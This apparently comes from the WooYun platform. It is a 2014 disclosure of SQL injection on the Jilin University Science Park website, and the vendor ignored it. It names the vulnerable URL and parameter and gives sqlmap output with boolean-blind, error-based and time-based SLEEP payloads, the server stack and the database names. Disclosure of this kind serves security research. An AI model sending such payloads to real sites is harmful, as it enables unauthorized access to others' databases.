wybug_title: 吉林大学科技园存在SQL注射
wybug_status: 漏洞已经通知厂商但是厂商忽略漏洞
wybug_detail: 漏洞详情 披露状态：   									2014-06-11：	细节已通知厂商并且等待厂商处理中									2014-06-16：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： 吉林大学科技园存在SQL注射 详细说明：  http://kjy.jlu.edu.cn/?file=info&act=view&id=335    漏洞证明：  Place: GETParameter: id    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: file=info&act=view&id=335 AND 1215=1215    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause    Payload: file=info&act=view&id=335 AND (SELECT 2426 FROM(SELECT COUNT(*),CONCAT(0x7171647a71,(SELECT (CASE WHEN (2426=2426) THEN 1 ELSE 0 END)),0x717a6f6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: file=info&act=view&id=335 AND SLEEP(5)---web server operating system: Linux CentOS 5.8web application technology: Apache 2.2.3, PHP 5.4.15back-end DBMS: MySQL 5.0sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: id    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: file=info&act=view&id=335 AND 1215=1215    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause    Payload: file=info&act=view&id=335 AND (SELECT 2426 FROM(SELECT COUNT(*),CONCAT(0x7171647a71,(SELECT (CASE WHEN (2426=2426) THEN 1 ELSE 0 END)),0x717a6f6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: file=info&act=view&id=335 AND SLEEP(5)---web server operating system: Linux CentOS 5.8web application technology: Apache 2.2.3, PHP 5.4.15back-end DBMS: MySQL 5.0available databases [3]:[*] information_schema[*] kjy[*] kjy_cy   修复方案：  参数过滤   版权声明：转载请注明来源 Hotler0o@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-06-16 16:40 厂商回复：  最新状态： 暂无
